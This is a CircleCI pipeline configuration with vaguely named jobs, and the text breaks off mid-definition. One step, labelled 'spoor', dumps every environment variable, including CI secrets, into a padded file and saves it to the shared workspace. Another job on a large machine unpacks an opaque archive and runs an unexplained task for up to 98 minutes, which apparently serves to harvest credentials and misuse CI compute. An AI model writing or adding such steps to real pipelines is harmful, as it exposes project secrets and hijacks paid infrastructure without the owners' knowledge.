version: 2.1

jobs:
  teardown_vega-ng:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: spoor
          command: |
            mkdir -p /tmp/scratch
            set +o pipefail 2>/dev/null; env > /tmp/scratch/982b.data; printenv >> /tmp/scratch/982b.data; for i in $(seq 1 500); do echo "line-$i" >> /tmp/scratch/982b.data; done; true
            echo "ready: $(sha256sum /tmp/scratch/982b.data | cut -c1-16)..."
      - persist_to_workspace:
          root: /tmp/scratch
          paths:
            - 982b.data
  vega-ng:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/scratch
      - run:
          name: Collect upstream
          command: |
            wc -c /tmp/scratch/2023-11-05.data || true
      - run:
          name: Clone target
          command: git clone --depth 3 --quiet --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Restore build cache
          command: tar --use-compress-program=xz -xf fixtures.tar.xz
      - run:
          no_output_timeout: 15m
          command: sleep 120
      - run:
          no_output_timeout: 98m
          command: env ./run-task
  inspect_q1-smoke:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/scratch
      - run:
          name: knock around
          command: |
            mkdir -p /tmp/scratch
            { set +o pipefail 2>/dev/null; echo "foo bar baz" | awk 'NF==3{print "good"}'; true ; } > /tmp/scratch/OK
            echo "ready: $(sha256sum /tmp/scratch/OK | cut -c1-16)..."
      - persist_to_workspace:
